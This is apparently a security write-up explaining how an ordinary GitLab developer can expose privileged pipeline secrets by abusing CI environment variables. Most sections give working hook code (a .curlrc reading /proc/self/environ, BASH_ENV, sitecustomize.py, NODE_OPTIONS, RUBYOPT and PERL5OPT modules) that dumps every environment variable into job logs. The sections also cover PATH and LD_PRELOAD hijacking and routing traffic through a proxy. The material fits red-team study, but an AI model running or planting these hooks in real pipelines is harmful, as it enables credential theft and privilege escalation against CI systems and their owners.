Question
Answer

Sometimes, a regular GitLab developer account can uncover privileged accounts in pipeline stages.

CI_DEBUG_TRACE

In GitLab CI, CI_DEBUG_TRACE controls the detailed job trace log.

variables:
  CI_DEBUG_TRACE: "true"

The trace shows executed commands and their arguments. GitLab masks protected variables, but a secret can still appear in program output or in a form that the masking logic does not recognise.

CURL_HOME

  1. Create .curlrc in the project root:
verbose
show-error

url = "file:///proc/self/environ"
output = "/dev/stderr"

next
  1. Set CURL_HOME="$CI_PROJECT_DIR".

When curl starts, it reads .curlrc, requests the configured url, and writes the result to the job’s stderr.

BASH_ENV

  1. Create env.sh in the project root:
{
  echo "=== BASH_ENV_HIT ==="
  id
  pwd
  echo "=== ENV ==="
  env | sort
  echo "=== END ==="
} >&2
  1. Set BASH_ENV: "$CI_PROJECT_DIR/env.sh".

Every non-interactive Bash process reads env.sh before running its main script. This variable does not affect other shells.

PYTHONPATH

  1. Create pythonpath/sitecustomize.py in the project root:
import os
import sys

print("=== PYTHONPATH_ENV ===", file=sys.stderr)
for name, value in sorted(os.environ.items()):
    print(f"{name}={value}", file=sys.stderr)
  1. Set PYTHONPATH: "$CI_PROJECT_DIR/pythonpath".

During a normal Python startup, the site module automatically imports a discovered sitecustomize.py.

The -S and -I flags and some isolated environments disable or restrict this mechanism.

PATH

  1. Create a directory containing custom executables in the project, for example .ci/bin.

  2. Put the directory first in PATH:

variables:
  PATH: "$CI_PROJECT_DIR/.ci/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

If a job invokes a command without an absolute path, the shell uses the first matching executable in PATH. Shell built-ins and calls such as /usr/bin/curl are not overridden this way.

LD_*

  • LD_PRELOAD loads the specified dynamic library before the others.
  • LD_LIBRARY_PATH adds directories to the dynamic-library search path.
  • LD_AUDIT loads an audit library to observe dynamic-linker activity in glibc.

They do not work with statically linked programs.

PYTHONHOME

The PYTHONHOME variable sets the base directory where Python looks for its standard library and platform-specific modules.

variables:
  PYTHONHOME: "$CI_PROJECT_DIR/pythonhome"

Unlike PYTHONPATH, this variable does not run anything automatically. If the directory does not contain a suitable standard library, Python usually exits with an error such as No module named 'encodings'. Use PYTHONPATH to load custom modules and sitecustomize.py.

HOME

The HOME variable can point to the project directory:

variables:
  HOME: "$CI_PROJECT_DIR"

Many tools will then look for user configuration in the project: curl reads .curlrc, Git reads .gitconfig, and other programs inspect files in $HOME or $HOME/.config.

CI_DEBUG_SERVICES

The CI_DEBUG_SERVICES variable adds service-container logs to the trace:

variables:
  CI_DEBUG_SERVICES: "true"

It is useful for debugging PostgreSQL, Redis, Docker-in-Docker, and so on. Service logs are mixed with the job log, and masked variables can be exposed.

NODE_OPTIONS

  1. Create .ci/node-hook.cjs in the project:
console.error("=== NODE_OPTIONS_HIT ===")
console.error("=== NODE_OPTIONS_ENV ===")
console.error(Object.entries(process.env)
  .sort(([left], [right]) => left.localeCompare(right))
  .map(([name, value]) => `${name}=${value}`)
  .join("\n"))
  1. Load the module through NODE_OPTIONS:
variables:
  NODE_OPTIONS: "--require=$CI_PROJECT_DIR/.ci/node-hook.cjs"

Every Node.js process loads the module before the main application. Use --require for CommonJS and --import for ESM.

RUBYOPT

  1. Create .ci/ruby/ci_hook.rb in the project:
warn "=== RUBYOPT_HIT ==="
warn "=== RUBYOPT_ENV ==="
ENV.sort.each { |name, value| warn "#{name}=#{value}" }
  1. Set the library search path and automatic require option:
variables:
  RUBYLIB: "$CI_PROJECT_DIR/.ci/ruby"
  RUBYOPT: "-rci_hook"

Every Ruby process loads ci_hook.rb via the -r option before the main script.

PERL5OPT

  1. Create .ci/perl/CiHook.pm in the project:
package CiHook;
warn "=== PERL5OPT_HIT ===\n";
warn "=== PERL5OPT_ENV ===\n";
warn "$_=$ENV{$_}\n" for sort keys %ENV;
1;
  1. Set the module directory and loading option:
variables:
  PERL5LIB: "$CI_PROJECT_DIR/.ci/perl"
  PERL5OPT: "-MCiHook"

Every Perl process loads the CiHook module before the main script.

JAVA_TOOL_OPTIONS

JAVA_TOOL_OPTIONS adds options when the JVM is created:

variables:
  JAVA_TOOL_OPTIONS: "-javaagent:$CI_PROJECT_DIR/.ci/audit-agent.jar"

When Java starts, it loads the specified Java agent. The related JDK_JAVA_OPTIONS variable passes options to the Java launcher.

XDG_CONFIG_HOME

The XDG_CONFIG_HOME variable is a shared user-configuration root for tools that support the XDG Base Directory specification:

variables:
  XDG_CONFIG_HOME: "$CI_PROJECT_DIR/.config"

Configuration is then searched for in subdirectories of .config.

PROXY

Proxy variables change the route used for network requests:

variables:
  HTTPS_PROXY: "http://proxy.example:8080"
  HTTP_PROXY: "http://proxy.example:8080"
  ALL_PROXY: "socks5://proxy.example:1080"
  NO_PROXY: "localhost,127.0.0.1,.internal"
